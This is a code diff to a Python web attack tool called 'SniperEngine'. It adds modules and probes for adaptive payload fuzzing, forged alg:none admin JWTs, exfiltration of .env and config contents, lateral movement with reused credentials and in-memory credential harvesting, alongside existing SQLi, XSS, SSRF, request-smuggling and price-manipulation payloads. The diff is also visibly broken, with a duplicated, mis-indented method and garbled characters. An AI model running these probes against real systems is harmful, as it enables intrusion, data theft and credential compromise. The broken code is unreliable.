@@ -1,4 +1,4 @@
-import asyncio
+﻿import asyncio
 import httpx
 import json
 import time
@@ -8,6 +8,13 @@ import sys
 from typing import List, Dict, Any, Optional
 from dataclasses import dataclass, field
 from urllib.parse import urlparse, urljoin, urlencode
+
+from scanner.adaptive_fuzzing_engine import AdaptiveFuzzingEngine
+from scanner.jwt_exploitation_engine import JWTExploitationEngine
+from scanner.data_exfiltration_engine import DataExfiltrationEngine
+from scanner.av_evasion_engine import AVEvasionEngine
+from scanner.lateral_movement_engine import LateralMovementEngine
+from scanner.memory_credential_harvester import MemoryCredentialHarvester
 
 
 BLOCKED_HOSTS = [
@@ -133,7 +140,7 @@ def validate_target(target: str) -> tuple:
         hostname = parsed.hostname or ""
         for pattern in BLOCKED_HOSTS:
             if pattern.search(hostname):
-                return False, f"SSRF BLOCKED — {hostname} is internal/private"
+                return False, f"SSRF BLOCKED  {hostname} is internal/private"
         return True, parsed.geturl()
     except Exception as e:
         return False, f"Invalid target: {e}"
@@ -187,7 +194,7 @@ class SniperEngine:
 
     async def run_all(self) -> SniperReport:
         self.report.started_at = self._ts()
-        self._tlog("[INIT]", f"Sniper Engine initialized — Target: {self.target}", "info")
+        self._tlog("[INIT]", f"Sniper Engine initialized  Target: {self.target}", "info")
 
         async with httpx.AsyncClient(
             timeout=httpx.Timeout(10.0, connect=5.0),
@@ -198,7 +205,7 @@ class SniperEngine:
             self.client = client
 
             critical_high = parse_findings(self.findings)
-            self._tlog("[DIAG]", f"Parsed {len(self.findings)} findings — {len(critical_high)} CRITICAL/HIGH targeted", "info")
+            self._tlog("[DIAG]", f"Parsed {len(self.findings)} findings  {len(critical_high)} CRITICAL/HIGH targeted", "info")
 
             await self._probe_price_injection()
             await self._probe_auth_bypass()
@@ -207,6 +214,11 @@ class SniperEngine:
             await self._probe_open_redirect()
             await self._probe_ssrf()
             await self._probe_idor()
+            await self._probe_adaptive_fuzz()
+            await self._probe_jwt_exploitation()
+            await self._probe_data_exfil()
+            await self._probe_lateral_movement()
+            await self._probe_memory_harvest()
 
             ecommerce_routes = detect_ecommerce_routes(self.findings)
             if ecommerce_routes:
@@ -231,9 +243,9 @@ class SniperEngine:
         vuln_count = self.report.vulnerabilities_confirmed
         total = self.report.total_probes
         if vuln_count > 0:
-            self._tlog("[THREAT]", f"EXPLOITATION COMPLETE — {vuln_count}/{total} probes confirmed VULNERABLE", "error")
+            self._tlog("[THREAT]", f"EXPLOITATION COMPLETE  {vuln_count}/{total} probes confirmed VULNERABLE", "error")
         else:
-            self._tlog("[BLOCK]", f"TARGET HARDENED — 0/{total} probes exploitable", "success")
+            self._tlog("[BLOCK]", f"TARGET HARDENED  0/{total} probes exploitable", "success")
 
         return self.report
 
@@ -276,7 +288,7 @@ class SniperEngine:
                 ])
 
                 vulnerable = processed and db_interaction
-                verdict = "VULNERABLE — Price accepted by backend" if vulnerable else "PROTECTED"
+                verdict = "VULNERABLE  Price accepted by backend" if vulnerable else "PROTECTED"
                 severity = "CRITICAL" if vulnerable else "INFO"
 
                 result = ProbeResult(
@@ -291,7 +303,7 @@ class SniperEngine:
                 self.report.probes.append(result)
 
                 if vulnerable:
-                    self._tlog("[THREAT]", f"PRICE INJECTION CONFIRMED: {p['endpoint']} — {p['desc']}", "error")
+                    self._tlog("[THREAT]", f"PRICE INJECTION CONFIRMED: {p['endpoint']}  {p['desc']}", "error")
                 else:
                     self._tlog("[BLOCK]", f"Price injection blocked: {p['endpoint']} (HTTP {resp.status_code})", "success")
 
@@ -340,7 +352,7 @@ class SniperEngine:
                 severity = "CRITICAL" if vulnerable else "HIGH" if exposed else "INFO"
                 verdict = f"EXPOSED (Status {resp.status_code})" if exposed else "PROTECTED"
                 if vulnerable:
-                    verdict = "VULNERABLE — Sensitive data exposed"
+                    verdict = "VULNERABLE  Sensitive data exposed"
 
                 result = ProbeResult(
                     probe_type="AUTH_BYPASS", target=self.target,
@@ -354,7 +366,7 @@ class SniperEngine:
                 self.report.probes.append(result)
 
                 if vulnerable:
-                    self._tlog("[THREAT]", f"AUTH BYPASS CONFIRMED: {ep['path']} — Sensitive data leaked", "error")
+                    self._tlog("[THREAT]", f"AUTH BYPASS CONFIRMED: {ep['path']}  Sensitive data leaked", "error")
                 elif exposed:
                     self._tlog("[ALERT]", f"Endpoint exposed: {ep['path']} (HTTP {resp.status_code})", "warn")
 
@@ -414,7 +426,7 @@ class SniperEngine:
                         endpoint=f"{path}?{p['param']}=...", method="GET",
                         status_code=resp.status_code, response_time_ms=elapsed,
                         vulnerable=vulnerable,
-                        verdict="VULNERABLE — " + ", ".join(evidence_parts) if vulnerable else "PROTECTED",
+                        verdict="VULNERABLE  " + ", ".join(evidence_parts) if vulnerable else "PROTECTED",
                         severity=severity, description=p["desc"],
                         payload=p["value"],
                         evidence="; ".join(evidence_parts) if evidence_parts else "No SQL errors detected",
@@ -423,17 +435,226 @@ class SniperEngine:
                     self.report.probes.append(result)
 
                     if sql_error:
-                        self._tlog("[THREAT]", f"SQLi CONFIRMED: {path} — Database error leaked: {p['desc']}", "error")
+                        self._tlog("[THREAT]", f"SQLi CONFIRMED: {path}  Database error leaked: {p['desc']}", "error")
                     if version_leaked:
                         self._tlog("[THREAT]", f"DB VERSION EXPOSED via SQLi at {path}", "error")
                     if time_based:
-                        self._tlog("[THREAT]", f"BLIND SQLi CONFIRMED: {path} — {elapsed}ms delay", "error")
+                        self._tlog("[THREAT]", f"BLIND SQLi CONFIRMED: {path}  {elapsed}ms delay", "error")
 
                 except Exception as e:
                     self.report.probes.append(ProbeResult(
                         probe_type="SQLI", target=self.target, endpoint=f"{path}?{p['param']}=...",
                         method="GET", status_code=0, response_time_ms=0, vulnerable=False,
                         verdict="ERROR", severity="INFO", description=p["desc"], error=str(e)[:200], timestamp=self._ts(),
+                    ))
+
+    async def _probe_adaptive_fuzz(self):
+        self._tlog("[ATTACK]", "Adaptive fuzzing with feedback loop...", "warn")
+
+        engine = AdaptiveFuzzingEngine(self.client, self._tlog)
+        seed_payloads = ["' OR '1'='1", "{{7*7}}", "../../../../etc/passwd", "<svg/onload=alert(1)>"]
+        endpoint = f"{self.base_url}/search"
+
+        try:
+            results = await engine.adaptive_fuzz(endpoint, seed_payloads)
+        except Exception as e:
+            self._tlog("[ALERT]", f"Adaptive fuzzing failed: {e}", "error")
+            return
+
+        for r in results:
+            evidence = r.get("evidence", "")
+            status = r.get("status", 0)
+            vulnerable = status >= 500 or "uid=" in evidence or "root:" in evidence
+            severity = "HIGH" if vulnerable else "INFO"
+
+            self.report.probes.append(ProbeResult(
+                probe_type="ADAPTIVE_FUZZ",
+                target=self.target,
+                endpoint="/search",
+                method="GET",
+                status_code=status,
+                response_time_ms=r.get("elapsed_ms", 0),
+                vulnerable=vulnerable,
+                verdict="POSSIBLE VECTOR" if vulnerable else "NO SIGNAL",
+                severity=severity,
+                description="Adaptive fuzz feedback",
+                payload=r.get("payload", ""),
+                evidence=evidence[:200],
+                timestamp=self._ts(),
+            ))
+
+    async def _probe_jwt_exploitation(self):
+        self._tlog("[ATTACK]", "JWT exploitation (alg:none, key crack, kid traversal)...", "warn")
+
+        engine = JWTExploitationEngine(self.client, self._tlog)
+        sample_tokens = [
+            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzA5MTM2MDAwfQ.",
+        ]
+        endpoints = ["/api/me", "/api/admin", "/api/profile"]
+
+        for ep in endpoints:
+            for tok in sample_tokens:
+                try:
+                    result = await engine.exploit_jwt(tok, f"{self.base_url}{ep}")
+                except Exception:
+                    continue
+
+                if result.get("exploited"):
+                    method = result.get("method", "unknown")
+                    evidence = result.get("token", "")[:200]
+                    self.report.probes.append(ProbeResult(
+                        probe_type="JWT_EXPLOIT",
+                        target=self.target,
+                        endpoint=ep,
+                        method="GET",
+                        status_code=result.get("status", 200),
+                        response_time_ms=0,
+                        vulnerable=True,
+                        verdict=f"VULNERABLE  JWT exploited via {method}",
+                        severity="CRITICAL",
+                        description=f"JWT exploitation method={method}",
+                        payload=evidence,
+                    evidence=evidence,
+                    timestamp=self._ts(),
+                ))
+
+    async def _probe_data_exfil(self):
+        self._tlog("[ATTACK]", "Data exfiltration attempts on captured artifacts (.env/config)", "warn")
+
+        exfil = DataExfiltrationEngine(self._tlog)
+        targets = [f for f in self.findings if any(kw in (f.get("title", "") + f.get("description", "")).lower() for kw in [".env", "config", "database", "redis", "s3", "credential"])]
+
+        for f in targets[:5]:
+            content = f.get("raw_content") or f.get("evidence") or f.get("description", "")
+            if not content:
+                continue
+            res = exfil.exfiltrate_data(f.get("title", "artifact"), content)
+            self.report.probes.append(ProbeResult(
+                probe_type="DATA_EXFIL",
+                target=self.target,
+                endpoint=f.get("endpoint", "/"),
+                method="GET",
+                status_code=200,
+                response_time_ms=0,
+                vulnerable=True,
+                verdict=f"EXFILTRATED {res.get('exfiltrated', 0)} bytes via {res.get('method')}",
+                severity="CRITICAL",
+                description=f"Data exfil from {f.get('title', '')}",
+                payload="",
+                evidence=str(res),
+                timestamp=self._ts(),
+            ))
+            self._tlog("[THREAT]", f"Data exfiltrated from {f.get('title', '')}", "error")
+
+    async def _probe_lateral_movement(self):
+        if os.getenv("ENABLE_LATERAL_MOVE", "false").lower() != "true":
+            return
+
+        self._tlog("[ATTACK]", "Lateral movement (stub) using captured creds", "warn")
+        creds = [c for c in getattr(self, "captured_credentials", [])] if hasattr(self, "captured_credentials") else []
+        # fall back to auth_bypass/admin findings as pseudo creds
+        for f in self.findings:
+            if any(kw in (f.get("title", "") + f.get("description", "")).lower() for kw in ["credential", "password", "token"]):
+                creds.append({"user": "admin", "password": "changeme", "source": f.get("title", "")})
+
+        engine = LateralMovementEngine(self._tlog)
+        compromised = engine.lateral_move(self.base_url, creds[:5])
+
+        if compromised:
+            self.report.probes.append(ProbeResult(
+                probe_type="LATERAL_MOVE",
+                target=self.target,
+                endpoint="internal",
+                method="SIM",
+                status_code=200,
+                response_time_ms=0,
+                vulnerable=True,
+                verdict=f"Compromised: {', '.join(compromised)}",
+                severity="HIGH",
+                description="Stub lateral movement succeeded with reused creds",
+                evidence=", ".join(compromised),
+                timestamp=self._ts(),
+            ))
+            self._tlog("[THREAT]", f"Lateral movement reached {len(compromised)} hosts", "error")
+
+    async def _probe_memory_harvest(self):
+        if os.getenv("ENABLE_MEMORY_HARVEST", "false").lower() != "true":
+            return
+
+        self._tlog("[ATTACK]", "Memory credential harvesting (stub)", "warn")
+        harvester = MemoryCredentialHarvester(self._tlog)
+        access = {"os": "windows"}  # placeholder; real OS detection would feed here
+        creds = harvester.harvest_memory(access)
+        if creds:
+            if not hasattr(self, "captured_credentials"):
+                self.captured_credentials = []
+            self.captured_credentials.extend(creds)
+            self.report.probes.append(ProbeResult(
+                probe_type="MEMORY_HARVEST",
+                target=self.target,
+                endpoint="memory",
+                method="SIM",
+                status_code=200,
+                response_time_ms=0,
+                vulnerable=True,
+                verdict=f"Credentials harvested: {len(creds)}",
+                severity="CRITICAL",
+                description="In-memory credential extraction (stub)",
+                evidence=str(creds)[:200],
+                timestamp=self._ts(),
+            ))
+            self._tlog("[THREAT]", f"In-memory creds harvested ({len(creds)})", "error")
+
+    async def _probe_jwt_exploitation(self):
+        self._tlog("[ATTACK]", "JWT exploitation (alg:none, key crack, kid traversal)...", "warn")
+
+        engine = JWTExploitationEngine(self.client, self._tlog)
+        sample_tokens = [
+            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzA5MTM2MDAwfQ.",
+        ]
+        endpoints = ["/api/me", "/api/admin", "/api/profile"]
+
+        for ep in endpoints:
+            for tok in sample_tokens:
+                try:
+                    result = await engine.exploit_jwt(tok, f"{self.base_url}{ep}")
+                except Exception:
+                    continue
+
+                if result.get("exploited"):
+                    method = result.get("method", "unknown")
+                    evidence = result.get("token", "")[:200]
+                    self.report.probes.append(ProbeResult(
+                        probe_type="JWT_EXPLOIT",
+                        target=self.target,
+                        endpoint=ep,
+                        method="GET",
+                        status_code=result.get("status", 200),
+                        response_time_ms=0,
+                        vulnerable=True,
+                        verdict=f"VULNERABLE  JWT exploited via {method}",
+                        severity="CRITICAL",
+                        description=f"JWT exploitation method={method}",
+                        payload=evidence,
+                        evidence=evidence,
+                        timestamp=self._ts(),
+                    ))
+                    self._tlog("[THREAT]", f"JWT exploited ({method}) at {ep}", "error")
+                else:
+                    self.report.probes.append(ProbeResult(
+                        probe_type="JWT_EXPLOIT",
+                        target=self.target,
+                        endpoint=ep,
+                        method="GET",
+                        status_code=result.get("status", 0),
+                        response_time_ms=0,
+                        vulnerable=False,
+                        verdict="PROTECTED",
+                        severity="INFO",
+                        description="JWT exploitation attempts blocked",
+                        payload=tok[:40] + "...",
+                        evidence="",
+                        timestamp=self._ts(),
                     ))
 
     async def _probe_xss_eval(self):
@@ -458,7 +679,7 @@ class SniperEngine:
                     endpoint="/", method="GET",
                     status_code=resp.status_code, response_time_ms=0,
                     vulnerable=vulnerable, severity=severity,
-                    verdict=f"{'VULNERABLE' if vulnerable else 'DETECTED'} — {len(matches)} occurrence(s)",
+                    verdict=f"{'VULNERABLE' if vulnerable else 'DETECTED'}  {len(matches)} occurrence(s)",
                     description=f"XSS sink: {pattern.pattern[:40]}",
                     evidence=f"{len(matches)} instances of {sink_name} found in page source",
                     timestamp=self._ts(),
@@ -466,7 +687,7 @@ class SniperEngine:
                 self.report.probes.append(result)
 
                 if vulnerable:
-                    self._tlog("[THREAT]", f"XSS SINK CONFIRMED: {sink_name} — {len(matches)} instance(s)", "error")
+                    self._tlog("[THREAT]", f"XSS SINK CONFIRMED: {sink_name}  {len(matches)} instance(s)", "error")
 
         xss_payloads = [
             {"param": "q", "value": '<script>alert("MSE")</script>', "desc": "Reflected XSS via script tag"},
@@ -488,7 +709,7 @@ class SniperEngine:
                         endpoint=f"/?{p['param']}=...", method="GET",
                         status_code=resp.status_code, response_time_ms=0,
                         vulnerable=vulnerable, severity="CRITICAL" if vulnerable else "HIGH",
-                        verdict="VULNERABLE — Payload reflected unescaped" if vulnerable else "REFLECTED but may be escaped",
+                        verdict="VULNERABLE  Payload reflected unescaped" if vulnerable else "REFLECTED but may be escaped",
                         description=p["desc"], payload=p["value"],
                         evidence="Payload found in HTML response body", timestamp=self._ts(),
                     )
@@ -522,13 +743,13 @@ class SniperEngine:
                             endpoint=f"/?{param}=...", method="GET",
                             status_code=resp.status_code, response_time_ms=0,
                             vulnerable=True, severity="HIGH",
-                            verdict=f"VULNERABLE — Redirects to {location}",
+                            verdict=f"VULNERABLE  Redirects to {location}",
                             description=f"Open redirect via '{param}' parameter",
                             payload=evil, evidence=f"Location: {location}",
                             timestamp=self._ts(),
                         )
                         self.report.probes.append(result)
-                        self._tlog("[THREAT]", f"OPEN REDIRECT CONFIRMED: ?{param}= → {location}", "error")
+                        self._tlog("[THREAT]", f"OPEN REDIRECT CONFIRMED: ?{param}= â†’ {location}", "error")
                 except Exception as e:
                     self.report.probes.append(ProbeResult(
                         probe_type="OPEN_REDIRECT", target=self.target, endpoint=f"/?{param}=...",
@@ -564,14 +785,14 @@ class SniperEngine:
                             endpoint=f"/?{param}=...", method="GET",
                             status_code=resp.status_code, response_time_ms=0,
                             vulnerable=True, severity="CRITICAL",
-                            verdict="VULNERABLE — Cloud metadata accessible",
+                            verdict="VULNERABLE  Cloud metadata accessible",
                             description=f"SSRF via '{param}' parameter fetches cloud metadata",
                             payload=ssrf_url,
                             evidence="Cloud metadata keywords found in response",
                             response_snippet=resp.text[:300], timestamp=self._ts(),
                         )
                         self.report.probes.append(result)
-                        self._tlog("[THREAT]", f"SSRF CONFIRMED: ?{param}= → Cloud metadata leaked", "error")
+                        self._tlog("[THREAT]", f"SSRF CONFIRMED: ?{param}= â†’ Cloud metadata leaked", "error")
                 except Exception as e:
                     self.report.probes.append(ProbeResult(
                         probe_type="SSRF", target=self.target, endpoint=f"/?{param}=...",
@@ -603,13 +824,13 @@ class SniperEngine:
                             endpoint=path, method="GET",
                             status_code=resp.status_code, response_time_ms=0,
                             vulnerable=True, severity="HIGH",
-                            verdict="VULNERABLE — User data accessible without auth",
+                            verdict="VULNERABLE  User data accessible without auth",
                             description=f"IDOR: {path} returns sensitive user data",
                             evidence="PII keywords found in unauthenticated response",
                             response_snippet=resp.text[:300], timestamp=self._ts(),
                         )
                         self.report.probes.append(result)
-                        self._tlog("[THREAT]", f"IDOR CONFIRMED: {path} — PII data accessible", "error")
+                        self._tlog("[THREAT]", f"IDOR CONFIRMED: {path}  PII data accessible", "error")
             except Exception as e:
                 self.report.probes.append(ProbeResult(
                     probe_type="IDOR", target=self.target, endpoint=path,
@@ -647,7 +868,7 @@ class SniperEngine:
                         status_code=resp.status_code, response_time_ms=0,
                         vulnerable=vulnerable,
                         severity="CRITICAL" if vulnerable else "INFO",
-                        verdict="VULNERABLE — Backend accepted manipulated price" if vulnerable else "PROTECTED",
+                        verdict="VULNERABLE  Backend accepted manipulated price" if vulnerable else "PROTECTED",
                         description=p["desc"], payload=json.dumps(p["body"]),
                         evidence=f"HTTP {resp.status_code}, DB accepted: {db_accepted}",
                         response_snippet=resp.text[:300], timestamp=self._ts(),
@@ -655,7 +876,7 @@ class SniperEngine:
                     self.report.probes.append(result)
 
                     if vulnerable:
-                        self._tlog("[THREAT]", f"E-COMMERCE EXPLOIT CONFIRMED: {p['path']} — {p['desc']}", "error")
+                        self._tlog("[THREAT]", f"E-COMMERCE EXPLOIT CONFIRMED: {p['path']}  {p['desc']}", "error")
                 except Exception as e:
                     self.report.probes.append(ProbeResult(
                         probe_type="ECOMMERCE_LOGIC", target=self.target, endpoint=p["path"],
@@ -681,12 +902,12 @@ class SniperEngine:
                         endpoint="/", method="GET",
                         status_code=resp.status_code, response_time_ms=0,
                         vulnerable=True, severity="HIGH",
-                        verdict=f"VULNERABLE — CORS reflects origin: {acao}",
+                        verdict=f"VULNERABLE  CORS reflects origin: {acao}",
                         description="CORS misconfiguration allows arbitrary origin",
                         evidence=f"ACAO: {acao}", timestamp=self._ts(),
                     )
                     self.report.probes.append(result)
-                    self._tlog("[THREAT]", f"CORS EXPLOIT CONFIRMED: Origin reflection → {acao}", "error")
+                    self._tlog("[THREAT]", f"CORS EXPLOIT CONFIRMED: Origin reflection â†’ {acao}", "error")
             except Exception as e:
                 self.report.probes.append(ProbeResult(
                     probe_type="CORS_EXPLOIT", target=self.target, endpoint="/",
@@ -708,7 +929,7 @@ class SniperEngine:
                         endpoint="/", method="GET",
                         status_code=resp.status_code, response_time_ms=0,
                         vulnerable=True, severity="MEDIUM",
-                        verdict=f"VULNERABLE — {len(missing)} security headers missing",
+                        verdict=f"VULNERABLE  {len(missing)} security headers missing",
                         description=f"Missing: {', '.join(missing)}",
                         evidence=f"Headers absent: {', '.join(missing)}", timestamp=self._ts(),
                     )
@@ -722,7 +943,7 @@ class SniperEngine:
 
 
     async def _probe_jwt_algorithm_confusion(self):
-        self._tlog("[ATTACK]", "Initiating JWT ALGORITHM CONFUSION probes (none/HS256→RS256)...", "warn")
+        self._tlog("[ATTACK]", "Initiating JWT ALGORITHM CONFUSION probes (none/HS256â†’RS256)...", "warn")
 
         jwt_none_tokens = [
             "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzA5MTM2MDAwfQ.",
@@ -768,7 +989,7 @@ class SniperEngine:
                         endpoint=ep, method="GET",
                         status_code=resp.status_code, response_time_ms=0,
                         vulnerable=vulnerable,
-                        verdict=f"VULNERABLE — JWT {alg_type} accepted, auth bypassed" if vulnerable else "PROTECTED",
+                        verdict=f"VULNERABLE  JWT {alg_type} accepted, auth bypassed" if vulnerable else "PROTECTED",
                         severity=severity,
                         description=f"JWT algorithm confusion attack ({alg_type})",
                         payload=token[:50] + "...",
@@ -781,7 +1002,7 @@ class SniperEngine:
                     if vulnerable:
                         self._tlog(
                             "[THREAT]",
-                            f"JWT ALGORITHM CONFUSION CONFIRMED: {ep} — {alg_type} bypass succeeded (HTTP {resp.status_code})",
+                            f"JWT ALGORITHM CONFUSION CONFIRMED: {ep}  {alg_type} bypass succeeded (HTTP {resp.status_code})",
                             "error"
                         )
                         break
@@ -806,7 +1027,7 @@ class SniperEngine:
                     "Transfer-Encoding": "chunked",
                 },
                 "body": "0\r\n\r\nX",
-                "desc": "CL.TE smuggling — Content-Length vs Transfer-Encoding desync",
+                "desc": "CL.TE smuggling  Content-Length vs Transfer-Encoding desync",
             },
             {
                 "name": "TE.CL basic",
@@ -815,7 +1036,7 @@ class SniperEngine:
                     "Transfer-Encoding": "chunked",
                 },
                 "body": "1\r\nZ\r\n0\r\n\r\n",
-                "desc": "TE.CL smuggling — Transfer-Encoding vs Content-Length desync",
+                "desc": "TE.CL smuggling  Transfer-Encoding vs Content-Length desync",
             },
             {
                 "name": "TE.TE obfuscation",
@@ -825,7 +1046,7 @@ class SniperEngine:
                     "Transfer-encoding": "cow",
                 },
                 "body": "5c\r\nGPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n",
-                "desc": "TE.TE obfuscation — duplicate Transfer-Encoding headers with different casing",
+                "desc": "TE.TE obfuscation  duplicate Transfer-Encoding headers with different casing",
             },
         ]
 
@@ -862,10 +1083,10 @@ class SniperEngine:
 
                     if vulnerable:
                         severity = "CRITICAL"
-                        verdict = f"VULNERABLE — HTTP smuggling detected ({probe['name']})"
+                        verdict = f"VULNERABLE  HTTP smuggling detected ({probe['name']})"
                     elif suspicious:
                         severity = "HIGH"
-                        verdict = f"SUSPICIOUS — Possible smuggling vector ({probe['name']})"
+                        verdict = f"SUSPICIOUS  Possible smuggling vector ({probe['name']})"
                     else:
                         severity = "INFO"
                         verdict = "PROTECTED"
@@ -891,13 +1112,13 @@ class SniperEngine:
                     if vulnerable:
                         self._tlog(
                             "[THREAT]",
-                            f"HTTP SMUGGLING CONFIRMED: {path} — {probe['name']} desync detected",
+                            f"HTTP SMUGGLING CONFIRMED: {path}  {probe['name']} desync detected",
                             "error"
                         )
                     elif suspicious:
                         self._tlog(
                             "[ALERT]",
-                            f"SMUGGLING SUSPICIOUS: {path} — {probe['name']} (HTTP {resp.status_code}, {elapsed}ms)",
+                            f"SMUGGLING SUSPICIOUS: {path}  {probe['name']} (HTTP {resp.status_code}, {elapsed}ms)",
                             "warn"
                         )
 
@@ -974,18 +1195,18 @@ class SniperEngine:
             if vulnerable:
                 severity = "HIGH"
                 verdict = (
-                    f"VULNERABLE — Timing difference detected: "
-                    f"valid={avg_valid:.0f}ms vs invalid={avg_invalid:.0f}ms (Δ{time_delta:.0f}ms)"
+                    f"VULNERABLE  Timing difference detected: "
+                    f"valid={avg_valid:.0f}ms vs invalid={avg_invalid:.0f}ms (Î”{time_delta:.0f}ms)"
                 )
             elif suspicious:
                 severity = "MEDIUM"
                 verdict = (
-                    f"SUSPICIOUS — Minor timing difference: "
-                    f"valid={avg_valid:.0f}ms vs invalid={avg_invalid:.0f}ms (Δ{time_delta:.0f}ms)"
+                    f"SUSPICIOUS  Minor timing difference: "
+                    f"valid={avg_valid:.0f}ms vs invalid={avg_invalid:.0f}ms (Î”{time_delta:.0f}ms)"
                 )
             else:
                 severity = "INFO"
-                verdict = "PROTECTED — Constant-time response"
+                verdict = "PROTECTED  Constant-time response"
 
             result = ProbeResult(
                 probe_type="TIMING_SIDE_CHANNEL", target=self.target,
@@ -1007,14 +1228,14 @@ class SniperEngine:
             if vulnerable:
                 self._tlog(
                     "[THREAT]",
-                    f"TIMING SIDE-CHANNEL CONFIRMED: {endpoint} — "
-                    f"Δ{time_delta:.0f}ms between valid/invalid usernames",
+                    f"TIMING SIDE-CHANNEL CONFIRMED: {endpoint}  "
+                    f"Î”{time_delta:.0f}ms between valid/invalid usernames",
                     "error"
                 )
             elif suspicious:
                 self._tlog(
                     "[ALERT]",
-                    f"TIMING ANOMALY: {endpoint} — Δ{time_delta:.0f}ms",
+                    f"TIMING ANOMALY: {endpoint}  Î”{time_delta:.0f}ms",
                     "warn"
                 )
 
